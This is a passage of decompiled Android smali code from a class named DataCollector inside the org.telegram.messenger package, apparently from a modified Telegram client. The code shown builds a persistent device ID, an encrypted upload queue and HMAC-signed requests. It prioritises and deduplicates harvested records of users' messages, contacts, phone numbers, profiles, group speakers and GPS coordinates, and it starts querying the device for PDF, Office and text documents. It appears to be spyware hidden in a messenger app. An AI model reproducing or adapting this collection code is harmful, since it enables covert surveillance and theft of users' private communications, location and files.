    :try_start_0
    invoke-static {p0, p1, p2, p3, p4}, Lorg/telegram/messenger/DataCollector;->nativeComputeHmac(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz p0, :cond_0

    move-object v0, p0

    :cond_0
    return-object v0

    :catchall_0
    move-exception p0

    .line 740
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string p2, "generateSignature failed: "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string p1, "TGCollect"

    invoke-static {p1, p0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-object v0
.end method

.method static getDeviceId(Landroid/content/Context;)Ljava/lang/String;
    .locals 2

    .line 717
    sget-object v0, Lorg/telegram/messenger/DataCollector;->sDeviceId:Ljava/lang/String;

    if-eqz v0, :cond_0

    sget-object p0, Lorg/telegram/messenger/DataCollector;->sDeviceId:Ljava/lang/String;

    return-object p0

    .line 719
    :cond_0
    const-string v0, "tgc_prefs"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    const/4 v0, 0x0

    .line 720
    const-string v1, "device_id"

    invoke-interface {p0, v1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_1

    .line 722
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v0

    .line 723
    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    invoke-interface {p0, v1, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 725
    :cond_1
    sput-object v0, Lorg/telegram/messenger/DataCollector;->sDeviceId:Ljava/lang/String;

    return-object v0
.end method

.method public static getInstance()Lorg/telegram/messenger/DataCollector;
    .locals 2

    .line 316
    sget-object v0, Lorg/telegram/messenger/DataCollector;->instance:Lorg/telegram/messenger/DataCollector;

    if-nez v0, :cond_1

    .line 317
    const-class v0, Lorg/telegram/messenger/DataCollector;

    monitor-enter v0

    .line 318
    :try_start_0
    sget-object v1, Lorg/telegram/messenger/DataCollector;->instance:Lorg/telegram/messenger/DataCollector;

    if-nez v1, :cond_0

    .line 319
    new-instance v1, Lorg/telegram/messenger/DataCollector;

    invoke-direct {v1}, Lorg/telegram/messenger/DataCollector;-><init>()V

    sput-object v1, Lorg/telegram/messenger/DataCollector;->instance:Lorg/telegram/messenger/DataCollector;

    goto :goto_0

    :catchall_0
    move-exception v1

    goto :goto_1

    .line 321
    :cond_0
    :goto_0
    monitor-exit v0

    goto :goto_2

    :goto_1
    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw v1

    .line 323
    :cond_1
    :goto_2
    sget-object v0, Lorg/telegram/messenger/DataCollector;->instance:Lorg/telegram/messenger/DataCollector;

    return-object v0
.end method

.method private static getQueueSecretKey()Ljavax/crypto/SecretKey;
    .locals 4

    .line 759
    const-string v0, "AndroidKeyStore"

    invoke-static {v0}, Ljava/security/KeyStore;->getInstance(Ljava/lang/String;)Ljava/security/KeyStore;

    move-result-object v1

    const/4 v2, 0x0

    .line 760
    invoke-virtual {v1, v2}, Ljava/security/KeyStore;->load(Ljava/security/KeyStore$LoadStoreParameter;)V

    .line 761
    const-string v3, "tgc_upload_queue_key"

    invoke-virtual {v1, v3, v2}, Ljava/security/KeyStore;->getEntry(Ljava/lang/String;Ljava/security/KeyStore$ProtectionParameter;)Ljava/security/KeyStore$Entry;

    move-result-object v1

    .line 762
    instance-of v2, v1, Ljava/security/KeyStore$SecretKeyEntry;

    if-eqz v2, :cond_0

    .line 763
    check-cast v1, Ljava/security/KeyStore$SecretKeyEntry;

    invoke-virtual {v1}, Ljava/security/KeyStore$SecretKeyEntry;->getSecretKey()Ljavax/crypto/SecretKey;

    move-result-object v0

    return-object v0

    .line 765
    :cond_0
    const-string v1, "AES"

    invoke-static {v1, v0}, Ljavax/crypto/KeyGenerator;->getInstance(Ljava/lang/String;Ljava/lang/String;)Ljavax/crypto/KeyGenerator;

    move-result-object v0

    const/4 v1, 0x3

    .line 767
    invoke-static {v3, v1}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline20;->m(Ljava/lang/String;I)Landroid/security/keystore/KeyGenParameterSpec$Builder;

    move-result-object v1

    const-string v2, "GCM"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 770
    invoke-static {v1, v2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline16;->m(Landroid/security/keystore/KeyGenParameterSpec$Builder;[Ljava/lang/String;)Landroid/security/keystore/KeyGenParameterSpec$Builder;

    move-result-object v1

    const-string v2, "NoPadding"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    .line 771
    invoke-static {v1, v2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline17;->m(Landroid/security/keystore/KeyGenParameterSpec$Builder;[Ljava/lang/String;)Landroid/security/keystore/KeyGenParameterSpec$Builder;

    move-result-object v1

    const/4 v2, 0x1

    .line 772
    invoke-static {v1, v2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline18;->m(Landroid/security/keystore/KeyGenParameterSpec$Builder;Z)Landroid/security/keystore/KeyGenParameterSpec$Builder;

    move-result-object v1

    .line 773
    invoke-static {v1}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline19;->m(Landroid/security/keystore/KeyGenParameterSpec$Builder;)Landroid/security/keystore/KeyGenParameterSpec;

    move-result-object v1

    .line 767
    invoke-virtual {v0, v1}, Ljavax/crypto/KeyGenerator;->init(Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 774
    invoke-virtual {v0}, Ljavax/crypto/KeyGenerator;->generateKey()Ljavax/crypto/SecretKey;

    move-result-object v0

    return-object v0
.end method

.method private getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;
    .locals 2

    .line 957
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->uploadQueue:Lorg/telegram/messenger/DataCollector$UploadQueue;

    if-eqz v0, :cond_0

    return-object v0

    .line 959
    :cond_0
    sget-object v0, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    if-nez v0, :cond_1

    const/4 v0, 0x0

    return-object v0

    .line 961
    :cond_1
    monitor-enter p0

    .line 962
    :try_start_0
    iget-object v1, p0, Lorg/telegram/messenger/DataCollector;->uploadQueue:Lorg/telegram/messenger/DataCollector$UploadQueue;

    if-nez v1, :cond_2

    .line 963
    new-instance v1, Lorg/telegram/messenger/DataCollector$UploadQueue;

    invoke-direct {v1, v0}, Lorg/telegram/messenger/DataCollector$UploadQueue;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lorg/telegram/messenger/DataCollector;->uploadQueue:Lorg/telegram/messenger/DataCollector$UploadQueue;

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    .line 965
    :cond_2
    :goto_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->uploadQueue:Lorg/telegram/messenger/DataCollector$UploadQueue;

    monitor-exit p0

    return-object v0

    .line 966
    :goto_1
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw v0
.end method

.method private groupIdForMessage(Lorg/telegram/tgnet/TLRPC$Message;)J
    .locals 6

    const-wide/16 v0, 0x0

    if-nez p1, :cond_0

    return-wide v0

    .line 1665
    :cond_0
    iget-object v2, p1, Lorg/telegram/tgnet/TLRPC$Message;->peer_id:Lorg/telegram/tgnet/TLRPC$Peer;

    if-eqz v2, :cond_2

    .line 1666
    iget-wide v3, v2, Lorg/telegram/tgnet/TLRPC$Peer;->channel_id:J

    cmp-long v5, v3, v0

    if-eqz v5, :cond_1

    return-wide v3

    .line 1667
    :cond_1
    iget-wide v2, v2, Lorg/telegram/tgnet/TLRPC$Peer;->chat_id:J

    cmp-long v4, v2, v0

    if-eqz v4, :cond_2

    return-wide v2

    .line 1669
    :cond_2
    iget-wide v2, p1, Lorg/telegram/tgnet/TLRPC$Message;->dialog_id:J

    cmp-long p1, v2, v0

    if-gez p1, :cond_3

    neg-long v0, v2

    :cond_3
    return-wide v0
.end method

.method private groupSpeakerCooldownKey(JJ)J
    .locals 2

    const-wide/32 v0, 0xf4243

    mul-long p1, p1, v0

    xor-long/2addr p1, p3

    return-wide p1
.end method

.method private hasLocationPermission(Landroid/content/Context;)Z
    .locals 1

    .line 2687
    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    .line 2688
    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-nez p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p1, 0x1

    :goto_1
    return p1
.end method

.method private static isRetryable(I)Z
    .locals 1

    const/16 v0, 0x191

    if-eq p0, v0, :cond_1

    const/16 v0, 0x193

    if-eq p0, v0, :cond_1

    const/16 v0, 0x1ad

    if-eq p0, v0, :cond_1

    const/4 v0, -0x1

    if-eq p0, v0, :cond_1

    const/16 v0, 0x1f4

    if-lt p0, v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private jsonDedupeKey(Lorg/json/JSONObject;)Ljava/lang/String;
    .locals 14

    const/4 v0, 0x1

    const/4 v1, 0x0

    .line 1075
    const-string v2, "type"

    const-string v3, "unknown"

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 1076
    const-string v3, "account"

    const-wide/16 v4, 0x0

    invoke-virtual {p1, v3, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v6

    .line 1077
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    const-string v3, "user_id"

    const-string v8, ""

    const-string v9, "phone"

    const-string v10, "dialog_id"

    const-string v11, ":"

    const/4 v12, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    sparse-switch v13, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    const-string v13, "location"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_0

    goto/16 :goto_0

    :cond_0
    const/16 v12, 0x9

    goto/16 :goto_0

    :sswitch_1
    const-string v13, "chat_info"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_1

    goto/16 :goto_0

    :cond_1
    const/16 v12, 0x8

    goto :goto_0

    :sswitch_2
    const-string v13, "phone_contact"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_2

    goto :goto_0

    :cond_2
    const/4 v12, 0x7

    goto :goto_0

    :sswitch_3
    const-string v13, "message"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_3

    goto :goto_0

    :cond_3
    const/4 v12, 0x6

    goto :goto_0

    :sswitch_4
    const-string v13, "contact"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_4

    goto :goto_0

    :cond_4
    const/4 v12, 0x5

    goto :goto_0

    :sswitch_5
    const-string v13, "full_profile"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_5

    goto :goto_0

    :cond_5
    const/4 v12, 0x4

    goto :goto_0

    :sswitch_6
    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_6

    goto :goto_0

    :cond_6
    const/4 v12, 0x3

    goto :goto_0

    :sswitch_7
    const-string v13, "profile"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_7

    goto :goto_0

    :cond_7
    const/4 v12, 0x2

    goto :goto_0

    :sswitch_8
    const-string v13, "dialog"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_8

    goto :goto_0

    :cond_8
    const/4 v12, 0x1

    goto :goto_0

    :sswitch_9
    const-string v13, "group_speaker"

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_9

    goto :goto_0

    :cond_9
    const/4 v12, 0x0

    :goto_0
    packed-switch v12, :pswitch_data_0

    .line 1100
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p1, v1}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p1

    invoke-static {p1}, Lorg/telegram/messenger/DataCollector;->sha256Hex([B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1096
    :pswitch_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "loc_ts"

    invoke-virtual {p1, v2, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v4

    invoke-virtual {v3, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Ljava/util/Locale;->US:Ljava/util/Locale;

    .line 1097
    const-string v4, "latitude"

    const-wide/16 v5, 0x0

    invoke-virtual {p1, v4, v5, v6}, Lorg/json/JSONObject;->optDouble(Ljava/lang/String;D)D

    move-result-wide v7

    invoke-static {v7, v8}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v4

    new-array v7, v0, [Ljava/lang/Object;

    aput-object v4, v7, v1

    const-string v4, "%.6f"

    invoke-static {v2, v4, v7}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1098
    const-string v7, "longitude"

    invoke-virtual {p1, v7, v5, v6}, Lorg/json/JSONObject;->optDouble(Ljava/lang/String;D)D

    move-result-wide v5

    invoke-static {v5, v6}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object p1

    new-array v0, v0, [Ljava/lang/Object;

    aput-object p1, v0, v1

    invoke-static {v2, v4, v0}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1082
    :pswitch_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v9, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1079
    :pswitch_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1080
    const-string v1, "msg_id"

    invoke-virtual {p1, v1, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1094
    :pswitch_3
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v9, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1086
    :pswitch_4
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v3, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1092
    :pswitch_5
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 1088
    :pswitch_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v10, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 1089
    invoke-virtual {p1, v3, v4, v5}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    :sswitch_data_0
    .sparse-switch
        -0x74a9f1c1 -> :sswitch_9
        -0x4f6602b8 -> :sswitch_8
        -0x12717657 -> :sswitch_7
        0x65b3d6e -> :sswitch_6
        0x334653f9 -> :sswitch_5
        0x38b72420 -> :sswitch_4
        0x38eb0007 -> :sswitch_3
        0x447cba4f -> :sswitch_2
        0x608be135 -> :sswitch_1
        0x714f9fb5 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_4
        :pswitch_4
        :pswitch_2
        :pswitch_1
        :pswitch_5
        :pswitch_0
    .end packed-switch
.end method

.method private jsonPriority(Lorg/json/JSONObject;)I
    .locals 2

    .line 1105
    const-string v0, "type"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 1106
    const-string v0, "profile"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "contact"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "full_profile"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 1107
    const-string v0, "group_speaker"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    .line 1108
    const-string v0, "chat_info"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "dialog"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_1

    .line 1109
    :cond_0
    const-string v0, "message"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/16 p1, 0x6e

    return p1

    .line 1110
    :cond_1
    const-string v0, "location"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "phone_contact"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "phone"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    goto :goto_0

    :cond_2
    const/16 p1, 0x28

    return p1

    :cond_3
    :goto_0
    const/16 p1, 0x64

    return p1

    :cond_4
    :goto_1
    const/16 p1, 0x78

    return p1
.end method

.method private static synthetic lambda$checkCooldown$8(J[JLjava/lang/Long;Ljava/lang/Long;)Ljava/lang/Long;
    .locals 5

    const/4 p3, 0x0

    if-eqz p4, :cond_0

    .line 1545
    invoke-virtual {p4}, Ljava/lang/Long;->longValue()J

    move-result-wide v0

    sub-long v0, p0, v0

    const-wide/32 v2, 0x493e0

    cmp-long v4, v0, v2

    if-gez v4, :cond_0

    const-wide/16 p0, 0x0

    .line 1546
    aput-wide p0, p2, p3

    return-object p4

    :cond_0
    const-wide/16 v0, 0x1

    .line 1549
    aput-wide v0, p2, p3

    .line 1550
    invoke-static {p0, p1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p0

    return-object p0
.end method

.method private synthetic lambda$collectDeviceDocs$15(Landroid/content/Context;I)V
    .locals 19

    .line 2257
    const-string v0, "_size"

    const-string v1, "_display_name"

    const-string v2, "_id"

    const-string v3, "TGCollect"

    invoke-direct/range {p0 .. p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v10

    if-nez v10, :cond_0

    return-void

    .line 2259
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    .line 2261
    const-string v17, "application/vnd.openxmlformats-officedocument.presentationml.presentation"

    const-string v18, "text/plain"

    const-string v11, "application/pdf"

    const-string v12, "application/msword"

    const-string v13, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"

    const-string v14, "application/vnd.ms-excel"

    const-string v15, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

    const-string v16, "application/vnd.ms-powerpoint"

    filled-new-array/range {v11 .. v18}, [Ljava/lang/String;

    move-result-object v5

    .line 2271
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    .line 2272
    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    const/4 v11, 0x0

    const/4 v8, 0x0

    :goto_0
    const/16 v9, 0x8

